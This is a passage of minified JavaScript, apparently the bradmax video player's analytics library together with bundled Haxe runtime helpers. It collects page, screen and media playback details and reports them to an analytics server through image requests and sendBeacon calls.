navigator;if(w&&this.nb(h),h&&w){for(w=[];0<this.buffer.length;)w.push(this.buffer.pop());for(;0<w.length;){h=w.pop(),h=this.aa(h.D,h.data),h+="&cc="+this.g.V(),navigator.sendBeacon(h,null)}}else this.Hb(w)},nb:function(w){if(w){this.T=new Na;var h=this.N.j;w=h;for(var F=(h=Object.keys(h)).length,P=0;P<F;){var O=w[h[P++]];O=O.uri;var R="&cc="+this.g.V();O+=R,navigator.sendBeacon(O,null)}this.N=new Na}else{for(this.T=new Na,w=h=this.N.j,F=(h=Object.keys(h)).length,P=0;P<F;){O=w[h[P++]];var Q=new Image;R="&cc="+this.g.V(),Q.src=""+O.uri+R}for(this.N=new Na,w=this.g.now();w+200>this.g.now(););}},Hb:function(w){try{if(this.X(),this.request(),w)for(var h=this.g.now();h+200>this.g.now(););}catch(F){}},ba:function(w,h){null==w&&(w=""),h=this.aa(w,h),this.request(w,h)},h:function(w){return""+p.o(w)},aa:function(w,h){null==w&&(w="");var F=[],P="";this.g.Ga(),F.push([this.h("lc"),this.g.Ub()]),F.push([this.h("sc"),this.g.Tb()]),this.g.F()||F.push([this.h("dc"),"true"]);var O=this.h("ln"),R=this.g;F.push([O,navigator.language||navigator.Ma||navigator.browserLanguage||navigator.systemLanguage||"unknown"]),O=this.h("zo"),R=this.g,F.push([O,""+(new Date).getTimezoneOffset()]),O=this.h("tz"),R=this.g,R=sb.Intl&&sb.Intl.DateTimeFormat?(new sb.Intl.DateTimeFormat).resolvedOptions().timeZone:"unknown",F.push([O,""+R]),F.push([this.h("pt"),""+p.o(this.g.d.title)]),F.push([this.h("lo"),""+p.o(this.g.d.location.href)]),O=this.h("la"),R=this.g,F.push([O,navigator.language||navigator.Ma||navigator.browserLanguage||navigator.systemLanguage||"unknown"]),O=this.h("cs"),R=this.g,F.push([O,document.characterSet]),(O=this.g.d.ac)!=this.Na&&""!=O&&null!=O&&(F.push([this.h("rf"),""+O]),this.Na=O),O=this.h("re"),R=this.g,F.push([O,p.o(R.na.availWidth)+"x"+p.o(R.na.availHeight)]),O=this.h("vp"),R=this.g,F.push([O,Math.max(R.d.documentElement.clientWidth,0|R.w.innerWidth)+"x"+Math.max(R.d.documentElement.clientHeight,0|R.w.innerHeight)]),O=this.h("dp"),R=this.g,R=null;try{R=function(W){for(var aa=1;!W(aa)&&16777216>=aa;)aa*=2;if(16777216<aa)W=0;else{for(var ma=aa/2;1<aa-ma;){var H=aa+ma>>1;W(H)?aa=H:ma=H}W=aa}return W}((function(W){return sb.matchMedia("(max-resolution: "+W+"dpi)").matches}))}catch(W){}F.push([O,""+(0==R?null:R)]),O=this.h("so"),R=this.g,F.push([O,-1!=(""+screen.orientation||screen.Ma||screen.Zb).indexOf("landscape")?"l":"p"]),F.push([this.h("ev"),""+h.event]),F.push([this.h("mi"),""+h.s]),F.push([this.h("ri"),""+h.Cb]),F.push([this.h("ct"),""+h.currentTime]),F.push([this.h("du"),""+h.duration]),F.push([this.h("vt"),""+h.title]),F.push([this.h("vo"),""+h.volume]),F.push([this.h("ms"),""+h.kb]),F.push([this.h("pr"),""+h.progress]),O=this.h("vr");try{var Q=h.Ta.width+"x"+h.Ta.height}catch(W){Q=""}if(F.push([O,Q]),F.push([this.h("br"),""+h.bitrate]),F.push([this.h("ss"),""+h.Gb]),F.push([this.h("sa"),""+h.Fb]),F.push([this.h("tg"),""+this.g.A(h.oa)]),F.push([this.h("pg"),""+this.g.A(h.yb)]),F.push([this.h("mt"),""+h.mimeType]),F.push([this.h("pv"),""+h.Ab]),F.push([this.h("ei"),""+h.pb]),this.Fa(F,h.jb),this.gb(F,h.fb),R=this.g,null!=l.u(R.w,R.i(R.sa))&&(O=this.h("ag"),R=this.g,F.push([O,""+l.u(R.w,R.i(R.sa))])),R=this.g,null!=l.u(R.w,R.i(R.ta))&&(O=this.h("sx"),R=this.g,F.push([O,""+l.u(R.w,R.i(R.ta))])),null!=h.M){Q=this.g.v(),O=0;for(var ja=h.M.length;O<ja;)R=O++,h.M[R]=Q-h.M[R];"er.time"==h.event&&null!=h.ob&&F.push([this.h("er"),""+h.ob]),F.push([this.h("eo"),""+this.g.A(h.M)]),F.push([this.h("ep"),""+this.g.A(h.G)])}if(null!=h.m&&null!=h.J){for(Q=this.g.v(),O=0,R=h.m.length,0<h.m.length&&(O=this.g.v()-h.m[R-1]),1==h.J.length<h.m.length&&(h.J=[O],(O=this.g.Ha(h)).m=[h.m.pop()+Q],O.S=[h.S.pop()],O.J=null,O.C=[h.C.pop()],this.buffer.push({D:w,data:O})),O=0,ja=h.m.length;O<ja;)R=O++,h.m[R]=Q-h.m[R];for(;-1!=(Q=h.J.indexOf(0));)h.J.splice(Q,1),h.m.splice(Q,1),h.S.splice(Q,1),h.C.splice(Q,1);F.push([this.h("qo"),""+this.g.A(h.m)]),F.push([this.h("qp"),""+this.g.A(h.S)]),F.push([this.h("ql"),""+this.g.A(h.J)]),F.push([this.h("qb"),""+this.g.A(h.C)])}if(null!=h.B){for(Q=this.g.v(),"buffer.start"==h.event&&(h.event="buffer.end",O=Q-h.B[h.B.length-1],null==h.L?h.L=[O]:h.L.push(O)),O=0,ja=h.B.length;O<ja;)R=O++,h.B[R]=Q-h.B[R];F.push([this.h("bo"),""+this.g.A(h.B)]),F.push([this.h("bp"),""+this.g.A(h.R)]),F.push([this.h("bl"),""+this.g.A(h.L)])}for(O=h=0;O<F.length;)R=F[O],++O,""!=R[1]&&"undefined"!=R[1]&&"null"!=R[1]&&"NaN"!=R[1]&&(P+=(0<h?"&":"")+R[0]+"="+encodeURIComponent(R[1])),++h;return("http:"==this.g.d.location.href.substr(0,5)?"http://":"https://")+this.g.rb()+"/"+w+"/?"+P+"&r="+Math.random()},Fa:function(w,h,F){if(null==F&&(F=0),null!=h){var P="_"+F;w.push([this.h("cy")+P,""+(null==h.type?"null":p.o(z.pa(h.type)))]),w.push([this.h("ci")+P,""+h.Xb]),w.push([this.h("cr")+P,""+h.Db]),w.push([this.h("ce")+P,""+h.title]),w.push([this.h("cg")+P,this.g.A(h.oa)]),w.push([this.h("pp")+P,""+(null==h.Bb?"null":p.o(z.pa(h.Bb)))]),null!=h.zb&&this.Fa(w,h.zb,F+1)}},gb:function(w,h){if(null!=h)for(var F=0,P="_"+F,O=0;O<h.length;){var R=h[O];++O,w.push([this.h("ay")+P,""+(null==R.type?"null":p.o(z.pa(R.type)))]),w.push([this.h("ai")+P,""+R.Wb]),w.push([this.h("ar")+P,""+R.Db]),w.push([this.h("at")+P,""+R.title]),w.push([this.h("ta")+P,this.g.A(R.oa)]),P="_"+ ++F}},request:function(w,h){if(null==w&&null==h&&this.La(),this.g&&""==this.g.U)null!=w&&null!=h&&this.ja.push({D:w,uri:h}),setTimeout(x(this,this.La),5e3);else if(null!=w&&null!=h){w=new Image;var F="&cc="+this.g.V();w.src=""+h+F}},La:function(){for(;0<this.ja.length;){var w=this.ja.shift(),h=new Image,F="&cc="+this.g.V();h.src=""+w.uri+F}},X:function(){for(var w=[];0<this.buffer.length;)w.push(this.buffer.pop());for(;0<w.length;){var h=w.pop();this.ba(h.D,h.data)}},Qb:function(w,h,F){null==w&&(w="");var P=0==h.event.indexOf("er.time");if((0==h.event.indexOf("er.perc")||P)&&null!=h.G){P=!1;for(var O=0,R=this.buffer;O<R.length;){var Q=R[O];if(++O,Q.data.s==h.s&&Q.D==w&&("er.perc"==Q.data.event||"er.time"==Q.data.event)){P=!0,F=Q.data,Q.data.event=h.event,F.G.push(h.G[0]),F.M.push(this.g.v());break}}return P||(F=h,this.buffer.push({D:w,data:F})),{K:!0,data:F}}return{K:!1,data:F}},Ra:function(w,h,F){return null==h.C?h.C=[F]:h.C.push(F),null==h.m?h.m=[this.g.v()]:h.m.push(this.g.v()),null==h.S?h.S=[w.currentTime]:h.S.push(w.currentTime),h},Ea:function(w,h){return null==h.m||(w=this.g.v()-h.m[h.m.length-1],null==h.J?h.J=[w]:h.J.push(w)),h},Eb:function(w,h,F){var P=this.g.Ha(w);return h=this.Ea(w,h,F),this.Ra(P,h,F)},Sb:function(w,h,F){null==w&&(w="");var P="quality.change"==h.event,O="buffer.end"==h.event,R="play"==h.event,Q="pause"==h.event,ja="complete"==h.event;Q="buffer.start"==h.event||Q||ja;var W=O||R,aa=0;Object.prototype.hasOwnProperty.call(this.ma.j,h.s)&&(aa=this.ma.j[h.s]),P&&null!=h.C&&(aa=this.ma.j[h.s]=h.C);var ma=!1,H=R;Object.prototype.hasOwnProperty.call(this.ca.j,h.s)&&(ma=this.ca.j[h.s]),ma&&P&&(H=!0),R&&(this.ca.j[h.s]=!0),Q&&(this.ca.j[h.s]=!1);for(var B=!1,A=0,Y=this.buffer;A<Y.length;){var Z=Y[A];if(++A,Z.data.s==h.s&&Z.D==w&&"quality.change"==Z.data.event){(F=Z.data).event="quality.change",1==P&&1==H?F=this.Eb(h,F,aa):0==ma&&1==H?F=this.Ra(h,F,aa):1==ma&&0==H&&(F=this.Ea(h,F,aa)),1==ja&&this.X(),B=!0;break}}return!B&&R&&((F=h).event="quality.change",F.C=[aa],F.m=[this.g.v()],F.S=[h.currentTime],this.buffer.push({D:w,data:F})),W||Q||P||O?{K:!0,data:F}:{K:!1,data:F}},Pb:function(w,h,F){null==w&&(w="");var P="buffer.start"==h.event,O="buffer.end"==h.event;if(P||O){for(var R=h.currentTime,Q=!1,ja=0,W=this.buffer;ja<W.length;){var aa=W[ja];if(++ja,aa.data.s==h.s&&aa.D==w&&("buffer.end"==aa.data.event||"buffer.start"==aa.data.event)){if(Q=!0,F=aa.data,h.event==aa.data.event)break;if(aa.data.event=h.event,O&&null==F.R)break;P&&(null==F.R?F.R=[R]:F.R.push(R),null==F.B?F.B=[this.g.v()]:F.B.push(this.g.v())),O&&null!=F.R&&0<F.R.length&&(aa=F.B.length,aa=this.g.v()-F.B[aa-1],null==F.L?F.L=[aa]:F.L.push(aa));break}}return Q||"buffer.start"!=h.event||((F=h).R=[R],F.B=[this.g.v()],this.buffer.push({D:w,data:F})),{K:!0,data:F}}return P||O?{K:!0,data:F}:{K:!1,data:F}},Rb:function(w,h){null==w&&(w="");var F=h.s,P={event:null};if("media.view"==h.event)return this.X(),this.Ka.add(h.s),!1;null!=h.G&&"number"==typeof h.G&&(h.G=[Va.Wa(h.G,I)]),null!=h.G&&null==h.M&&(h.M=[this.g.v()]);var O=this.Qb(w,h,P),R=O.K;return P=O.data,O=(P=this.Sb(w,h,P)).K,P=P.data,w=(h=this.Pb(w,h,P)).K,P=h.data,!!(R||O||w)&&(this.Ka.remove(F),(null!=P.G&&10<=P.G.length||null!=P.C&&10<=P.C.length||null!=P.L&&10<=P.L.length)&&this.X(),!0)},Vb:function(){},action:function(w,h){null==w&&(w=""),""==w&&null==h||(h.event=h.event,h.s=h.materialID,h.Cb=h.relatedID,h.pb=h.externalId,h.currentTime=h.currentTime,h.duration=h.duration,h.title=h.title,h.volume=h.volume,h.kb=h.currentState,h.progress=h.progress,h.Ta=h.videoResolution,h.bitrate=h.bitrate,h.Gb=h.selectedSubtitle,h.Fb=h.selectedAudio,h.oa=h.tags,h.yb=h.pageTags,h.mimeType=h.mimeType,h.Ab=h.playerVersion,h.M=h.engagementRateTimeOffset,h.G=h.engagementRatePosition,h.fb=h.artist,h.jb=h.collection,h.$b=h.positionInCollection,this.g.Ga(),""==w||null==h||""==h.event?(w="WRONG REQUEST:\nCID: "+w+"\nDATA: "+p.o(h),console.warn(w)):"media.user.start"==h.event||"media.user.end"==h.event?this.Ib(w,h):0==this.Rb(w,h)&&this.ba(w,h))},Ib:function(w,h){null==w&&(w="");var F=w+"|"+p.o(h.s);switch(h.event){case"media.user.end":if(Object.prototype.hasOwnProperty.call(this.T.j,F)){var P=this.T;Object.prototype.hasOwnProperty.call(P.j,F)&&delete P.j[F]}Object.prototype.hasOwnProperty.call(this.N.j,F)&&(P=this.N,Object.prototype.hasOwnProperty.call(P.j,F)&&delete P.j[F],this.ba(w,h));break;case"media.user.start":Object.prototype.hasOwnProperty.call(this.T.j,F)||(P=this.aa(w,h),this.T.j[F]={uri:P,D:w}),Object.prototype.hasOwnProperty.call(this.N.j,F)||(this.ba(w,h),h.event="media.user.end",P=this.aa(w,h),this.N.j[F]={uri:P,D:w})}},H:f},Math.l=!0,l.l=!0,l.u=function(w,h){try{return w[h]}catch(F){return null}},l.lb=function(w,h){Object.prototype.hasOwnProperty.call(w,h)&&delete w[h]},p.l=!0,p.o=function(w){return Va.ga(w,"")},p.parseInt=function(w){return w=parseInt(w),isNaN(w)?null:w},p.random=function(w){return 0>=w?0:Math.floor(Math.random()*w)};var J,z={pa:function(w){return 0>w?4294967296+w:w+0}};m.l=!0,m.ab=!0,v.l=!0,v.Jb=function(w){return w instanceof v?w.Ca:w instanceof Error?w:new da(w)},v.Da=Error,v.prototype=r(Error.prototype,{Yb:function(){return this.Ca},H:v}),M.l=!0,M.prototype={Sa:function(){},H:M},da.l=!0,da.Da=v,da.prototype=r(v.prototype,{H:da}),u.l=!0,u.prototype={add:function(w){w=new Oa(w,null),null==this.j?this.j=w:this.q.next=w,this.q=w,this.length++},remove:function(w){for(var h=null,F=this.j;null!=F;){if(F.item==w)return null==h?this.j=F.next:h.next=F.next,this.q==F&&(this.q=h),this.length--,!0;h=F,F=F.next}return!1},H:u},Oa.l=!0,Oa.prototype={H:Oa},Na.l=!0,Na.$a=[m],Na.prototype={H:Na},Va.l=!0,Va.qb=function(w){if(null==w)return null;if(w instanceof Array)return Array;var h=w.H;return null!=h?h:null!=(w=Va.Ba(w))?Va.cb(w):null},Va.ga=function(w,h){if(null==w)return"null";if(5<=h.length)return"<...>";var F=typeof w;switch("function"==F&&(w.l||w.Ya)&&(F="object"),F){case"function":return"<function>";case"object":if(w instanceof Array){F="[",h+="\t";for(var P=0,O=w.length;P<O;){var R=P++;F+=(0<R?",":"")+Va.ga(w[R],h)}return F+"]"}try{P=w.toString}catch(Q){return"???"}if(null!=P&&P!=Object.toString&&"function"==typeof P&&"[object Object]"!=(F=w.toString()))return F;for(O in F="{\n",h+="\t",P=null!=w.hasOwnProperty,O=null,w)P&&!w.hasOwnProperty(O)||"prototype"==O||"__class__"==O||"__super__"==O||"__interfaces__"==O||"__properties__"==O||(2!=F.length&&(F+=", \n"),F+=h+O+" : "+Va.ga(w[O],h));return F+"\n"+(h=h.substring(1))+"}";case"string":return w;default:return String(w)}},Va.fa=function(w,h){if(null==w)return!1;if(w==h)return!0;var F=w.$a;if(null!=F)for(var P=0,O=F.length;P<O;){var R=P++;if((R=F[R])==h||Va.fa(R,h))return!0}return Va.fa(w.Da,h)},Va.Za=function(w,h){if(null==h)return!1;switch(h){case Array:return w instanceof Array;case L:return"boolean"==typeof w;case D:return null!=w;case I:return"number"==typeof w;case E:return"number"==typeof w&&(0|w)===w;case String:return"string"==typeof w;default:if(null==w)return!1;if("function"==typeof h){if(Va.Xa(w,h))return!0}else if("object"==typeof h&&Va.bb(h)&&w instanceof h)return!0;return h==G&&null!=w.l||h==N&&null!=w.Ya}},Va.Xa=function(w,h){return w instanceof h||!!h.ab&&Va.fa(Va.qb(w),h)},Va.Wa=function(w,h){if(null==w||Va.Za(w,h))return w;throw v.Jb("Cannot cast "+p.o(w)+" to "+p.o(h))},Va.Ba=function(w){return"Object"==(w=Va.eb.call(w).slice(8,-1))||"Function"==w||"Math"==w||"JSON"==w?null:w},Va.bb=function(w){return null!=Va.Ba(w)},Va.cb=function(w){return wa[w]},wa.ra|=0,"undefined"!=typeof performance&&"function"==typeof performance.now&&(t.now=performance.now.bind(performance)),null==String.fromCodePoint&&(String.fromCodePoint=function(w){return 65536>w?String.fromCharCode(w):String.fromCharCode(55232+(w>>10))+String.fromCharCode(56320+(1023&w))}),Object.defineProperty(String.prototype,"__class__",{value:String,enumerable:!1,writable:!0}),String.l=!0,Array.l=!0,Date.prototype.H=Date,Date.l="Date";var E={},D={},I=Number,L=Boolean,G={},N={};Va.eb={}.toString,f.wb()}(void 0!==sb?sb:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this)}(window),xb.exports&&(pb.bradmax_analytics_bams=xb.exports)}catch(sb){console.error(sb)}}!function(sb){function Ja(b,c){for(var d in b=Object.create(b),c)b[d]=c[d];return c.toString!==Object.prototype.toString&&(b.toString=c.toString),b}function U(b,c){return null==c?null:(null==c.__id__&&(c.__id__=sb.$haxeUID++),null==b.hx__closures__?b.hx__closures__={}:d=b.hx__closures__[c.__id__],null==d&&(d=c.bind(b),b.hx__closures__[c.__id__]=d),d);var d}var Oa,wa={},Va=function(){return fb.__string_rec(this,"")},Na=Na||{},u=function(b,c){this.r=new RegExp(b,c.split("u").join(""))};wa.EReg=u,u.__name__="EReg",u.prototype={r:null,match:function(b){return this.r.global&&(this.r.lastIndex=0),this.r.m=this.r.exec(b),this.r.s=b,null!=this.r.m},matched:function(b){if(null!=this.r.m&&0<=b&&b<this.r.m.length)return this.r.m[b];throw yb.thrown("EReg::matched")},split:function(b){return b.replace(this.r,"#__delim__#").split("#__delim__#")},__class__:u};var da=function(){};wa.HxOverrides=da,da.__name__="HxOverrides",da.cca=function(b,c){if((b=b.charCodeAt(c))==b)return b},da.substr=function(b,c,d){if(null==d)d=b.length;else if(0>d){if(0!=c)return"";d=b.length+d}return b.substr(c,d)},da.remove=function(b,c){return-1!=(c=b.indexOf(c))&&(b.splice(c,1),!0)},da.now=function(){return Date.now()};var M=function(){};wa.Lambda=M,M.__name__="Lambda",M.exists=function(b,c){for(b=b instanceof Array?new qe(b):b.iterator();b.hasNext();){if(c(b.next()))return!0}return!1};var v=function(){};wa.MacroTools=v,v.__name__="MacroTools",Math.__name__="Math";var m=function(){};wa.Reflect=m,m.__name__="Reflect",m.field=function(b,c){try{return b[c]}catch(d){return null}},m.getProperty=function(b,c){var d;return null==b?null:!!b.__properties__&&(d=b.__properties__["get_"+c])?b[d]():b[c]},m.setProperty=function(b,c,d){var q;!!b.__properties__&&(q=b.__properties__["set_"+c])?b[q](d):b[c]=d},m.fields=function(b){var c=[];if(null!=b){var q,d=Object.prototype.hasOwnProperty;for(q in b)"__id__"!=q&&"hx__closures__"!=q&&d.call(b,q)&&c.push(q)}return c},m.isFunction=function(b){return"function"==typeof b&&!(b.__name__||b.__ename__)},m.compare=function(b,c){return b==c?0:b>c?1:-1},m.compareMethods=function(b,c){return b==c||!(!m.isFunction(b)||!m.isFunction(c))&&(b.scope==c.scope&&b.method==c.method&&null!=b.method)},m.isEnumValue=function(b){return null!=b&&null!=b.__enum__},m.deleteField=function(b,c){return!!Object.prototype.hasOwnProperty.call(b,c)&&(delete b[c],!0)},m.copy=function(b){if(null==b)return null;for(var c={},d=0,q=m.fields(b);d<q.length;){var X=q[d];++d,c[X]=m.field(b,X)}return c};var p=function(){};wa.Std=p,p.__name__="Std",p.string=function(b){return fb.__string_rec(b,"")},p.parseInt=function(b){if(null!=b)for(var c=0,d=b.length;c<d;){var q=c++,X=b.charCodeAt(q);if(8>=X||14<=X&&32!=X&&45!=X){if(c=b.charCodeAt(q+1),b=parseInt(b,120==c||88==c?16:10),isNaN(b))break;return b}}return null},p.random=function(b){return 0>=b?0:Math.floor(Math.random()*b)};var l=function(){this.b=""};wa.StringBuf=l,l.__name__="StringBuf",l.prototype={b:null,__class__:l};var f=function(){};wa.StringTools=f,f.__name__="StringTools",f.htmlEscape=function(b,c){for(var d="",q=0,X=b;q<X.length;){var ra=q++,Aa=(b=X).charCodeAt(ra);switch(55296<=Aa&&56319>=Aa&&(Aa=Aa-55232<<10|1023&b.charCodeAt(ra+1)),65536<=(b=Aa)&&++q,b){case 34:d=c?d+"&quot;":d+String.fromCodePoint(b);break;case 38:d+="&amp;";break;case 39:d=c?d+"&#039;":d+String.fromCodePoint(b);break;case 60:d+="&lt;";break;case 62:d+="&gt;";break;default:d+=String.fromCodePoint(b)}}return d},f.startsWith=function(b,c){return b.length>=c.length&&0==b.lastIndexOf(c,0)},f.endsWith=function(b,c){var d=c.length,q=b.length;return q>=d&&b.indexOf(c,q-d)==q-d},f.isSpace=function(b,c){return 8<(b=da.cca(b,c))&&14>b||32==b},f.ltrim=function(b){for(var c=b.length,d=0;d<c&&f.isSpace(b,d);)++d;return 0<d?da.substr(b,d,c-d):b},f.rtrim=function(b){for(var c=b.length,d=0;d<c&&f.isSpace(b,c-d-1);)++d;return 0<d?da.substr(b,0,c-d):b},f.trim=function(b){return f.ltrim(f.rtrim(b))},f.replace=function(b,c,d){return b.split(c).join(d)},f.hex=function(b,c){for(var d="";d="0123456789ABCDEF".charAt(15&b)+d,0<(b>>>=4););if(null!=c)for(;d.length<c;)d="0"+d;return d};var g=function(){};wa.Type=g,g.__name__="Type",g.createInstance=function(b,c){return new(Function.prototype.bind.apply(b,[null].concat(c)))},g.getInstanceFields=function(b){var d,c=[];for(d in b.prototype)c.push(d);return da.remove(c,"__class__"),da.remove(c,"__properties__"),c},g.enumParameters=function(b){var c=Na[b.__enum__].__constructs__[b._hx_index].__params__;if(null!=c){for(var d=[],q=0;q<c.length;){var X=c[q];++q,d.push(b[X])}return d}return[]};var t_toString=function(b){switch(b){case 0:return"Element";case 1:return"PCData";case 2:return"CData";case 3:return"Comment";case 4:return"DocType";case 5:return"ProcessingInstruction";case 6:return"Document"}},r=function(b){this.nodeType=b,this.children=[],this.attributeMap=new Jb};wa.Xml=r,r.__name__="Xml",r.parse=function(b){return Jd.parse(b)},r.createElement=function(b){var c=new r(r.Element);if(c.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==c.nodeType?"null":t_toString(c.nodeType)));return c.nodeName=b,c},r.createPCData=function(b){var c=new r(r.PCData);if(c.nodeType==r.Document||c.nodeType==r.Element)throw yb.thrown("Bad node type, unexpected "+(null==c.nodeType?"null":t_toString(c.nodeType)));return c.nodeValue=b,c},r.createCData=function(b){var c=new r(r.CData);if(c.nodeType==r.Document||c.nodeType==r.Element)throw yb.thrown("Bad node type, unexpected "+(null==c.nodeType?"null":t_toString(c.nodeType)));return c.nodeValue=b,c},r.createComment=function(b){var c=new r(r.Comment);if(c.nodeType==r.Document||c.nodeType==r.Element)throw yb.thrown("Bad node type, unexpected "+(null==c.nodeType?"null":t_toString(c.nodeType)));return c.nodeValue=b,c},r.createDocType=function(b){var c=new r(r.DocType);if(c.nodeType==r.Document||c.nodeType==r.Element)throw yb.thrown("Bad node type, unexpected "+(null==c.nodeType?"null":t_toString(c.nodeType)));return c.nodeValue=b,c},r.createProcessingInstruction=function(b){var c=new r(r.ProcessingInstruction);if(c.nodeType==r.Document||c.nodeType==r.Element)throw yb.thrown("Bad node type, unexpected "+(null==c.nodeType?"null":t_toString(c.nodeType)));return c.nodeValue=b,c},r.createDocument=function(){return new r(r.Document)},r.prototype={nodeType:null,nodeName:null,nodeValue:null,parent:null,children:null,attributeMap:null,get:function(b){if(this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));return this.attributeMap.h[b]},set:function(b,c){if(this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));this.attributeMap.h[b]=c},exists:function(b){if(this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));return Object.prototype.hasOwnProperty.call(this.attributeMap.h,b)},attributes:function(){if(this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));return new ef(this.attributeMap.h)},elements:function(){if(this.nodeType!=r.Document&&this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element or Document but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));for(var b=[],c=0,d=this.children;c<d.length;){var q=d[c];++c,q.nodeType==r.Element&&b.push(q)}return new qe(b)},firstElement:function(){if(this.nodeType!=r.Document&&this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element or Document but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));for(var b=0,c=this.children;b<c.length;){var d=c[b];if(++b,d.nodeType==r.Element)return d}return null},addChild:function(b){if(this.nodeType!=r.Document&&this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element or Document but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));null!=b.parent&&b.parent.removeChild(b),this.children.push(b),b.parent=this},removeChild:function(b){if(this.nodeType!=r.Document&&this.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element or Document but found "+(null==this.nodeType?"null":t_toString(this.nodeType)));return!!da.remove(this.children,b)&&(b.parent=null,!0)},toString:function(){return we.print(this)},__class__:r};var x=function(){};wa["bradmax.analytics.Event"]=x,x.__name__="bradmax.analytics.Event";var z=function(){};wa["bradmax.analytics.RequestParams_v1"]=z,z.__name__="bradmax.analytics.RequestParams_v1";var J=function(){};wa["bradmax.analytics.Log_v1_Item"]=J,J.__name__="bradmax.analytics.Log_v1_Item",J.prototype={time:null,cookie:null,external_id:null,referer:null,local_cookie:null,session_cookie:null,peer_ip:null,host_ip:null,host_name:null,page_title:null,page_location:null,page_language:null,page_characterset:null,page_referer:null,page_tags:null,screen_resolution:null,screen_viewport:null,screen_dpi:null,screen_orientation:null,media_material_id:null,media_related_id:null,media_current_time:null,media_duration:null,media_title:null,media_volume:null,media_current_state:null,media_progress:null,media_resolution:null,media_bitrate:null,media_selected_subtitle:null,media_selected_audio:null,media_tags:null,media_mime_type:null,media_is_drm_protected:null,media_related_url:null,media_engagement_rate_time_offset:null,media_engagement_rate_position:null,media_engagement_rate_resolution:null,player_version:null,event:null,user_agent:null,user_agent_family:null,user_agent_major:null,user_agent_minor:null,user_agent_patch:null,os_family:null,os_major:null,os_minor:null,os_patch:null,os_patch_minor:null,device_device:null,device_brand:null,device_model:null,is_bot:null,has_cookies:null,debug:null,client_token:null,client_domain:null,client_client:null,client_sub:null,client_group:null,client_rand:null,client_checksum:null,client_sum:null,client_id:null,user_sex:null,user_age:null,__class__:J};var E=Na["bs.Level"]={__ename__:!0,__constructs__:null,Log:{_hx_name:"Log",_hx_index:0,__enum__:"bs.Level",toString:Va},Error:{_hx_name:"Error",_hx_index:1,__enum__:"bs.Level",toString:Va},Warn:{_hx_name:"Warn",_hx_index:2,__enum__:"bs.Level",toString:Va},Info:{_hx_name:"Info",_hx_index:3,__enum__:"bs.Level",toString:Va},Debug:{_hx_name:"Debug",_hx_index:4,__enum__:"bs.Level",toString:Va}};E.__constructs__=[E.Log,E.Error,E.Warn,E.Info,E.Debug];var D=function(){};wa["bs.Console"]=D,D.__name__="bs.Console",D.error=function(b){console.error(b)},D.logColor=function(b,c,d){},D.log=function(b){},D.warn=function(b){},D.info=function(b){},D.debug=function(b){},D.time=function(b){},D.timeEnd=function(b){},D.group=function(b,c){},D.groupCollapsed=function(b,c){},D.groupEnd=function(b,c){},D.trace=function(b,c){};var I=function(b){this.url=b,this.headers=[],this.params=[],this.emptyOnData=U(this,this.onData)};wa["haxe.http.HttpBase"]=I,I.__name__="haxe.http.HttpBase",I.prototype={url:null,responseBytes:null,responseAsString:null,postData:null,postBytes:null,headers:null,params:null,emptyOnData:null,setHeader:function(b,c){for(var d=0,q=this.headers.length;d<q;){var X=d++;if(this.headers[X].name==b)return void(this.headers[X]={name:b,value:c})}this.headers.push({name:b,value:c})},addParameter:function(b,c){this.params.push({name:b,value:c})},setPostData:function(b){this.postData=b,this.postBytes=null},onData:function(b){},onBytes:function(b){},onError:function(b){},onStatus:function(b){},hasOnData:function(){return!m.compareMethods(U(this,this.onData),this.emptyOnData)},success:function(b){this.responseBytes=b,this.responseAsString=null,this.hasOnData()&&this.onData(this.get_responseData()),this.onBytes(this.responseBytes)},get_responseData:function(){return null==this.responseAsString&&null!=this.responseBytes&&(this.responseAsString=this.responseBytes.getString(0,this.responseBytes.length,Fe.UTF8)),this.responseAsString},__class__:I,__properties__:{get_responseData:"get_responseData"}};var L=function(b){this.async=!0,this.withCredentials=!1,I.call(this,b)};wa["haxe.http.HttpJs"]=L,L.__name__="haxe.http.HttpJs",L.__super__=I,L.prototype=Ja(I.prototype,{async:null,withCredentials:null,req:null,request:function(b){var c=this;this.responseBytes=this.responseAsString=null;var d=this.req=Tb.createXMLHttpRequest(),q=function(Ub){if(4==d.readyState){try{var Mb=d.status}catch(Bc){Mb=null}if(0==Mb&&Tb.get_supported()&&null!=sb.location&&(Ub=sb.location.protocol.toLowerCase(),new u("^(?:about|app|app-storage|.+-extension|file|res|widget):$","").match(Ub)&&(Mb=null!=d.response?200:404)),null==Mb&&(Mb=null),null!=Mb&&c.onStatus(Mb),null!=Mb&&200<=Mb&&400>Mb)c.req=null,c.success(Uc.ofData(d.response));else if(null==Mb||0==Mb&&null==d.response)c.req=null,c.onError("Failed to connect or resolve host");else if(null==Mb)c.req=null,Mb=null!=d.response?Uc.ofData(d.response):null,c.responseBytes=Mb,c.onError("Http Error #"+d.status);else switch(Mb){case 12007:c.req=null,c.onError("Unknown host");break;case 12029:c.req=null,c.onError("Failed to connect to host");break;default:c.req=null,Mb=null!=d.response?Uc.ofData(d.response):null,c.responseBytes=Mb,c.onError("Http Error #"+d.status)}}};this.async&&(d.onreadystatechange=q);var X=this.postData,ra=this.postBytes,Aa=null==X?null==ra?null:new Blob([ra.b.bufferValue]):null==ra?X:null;if(null!=Aa)b=!0;else for(X=0,ra=this.params;X<ra.length;){var Qa=ra[X];++X,Aa=null==Aa?"":(null==Aa?"null":p.string(Aa))+"&";var Wa=Qa.name;Aa=(null==Aa?"null":p.string(Aa))+encodeURIComponent(Wa)+"="+encodeURIComponent(Qa.value)}try{if(b)d.open("POST",this.url,this.async);else if(null!=Aa){var 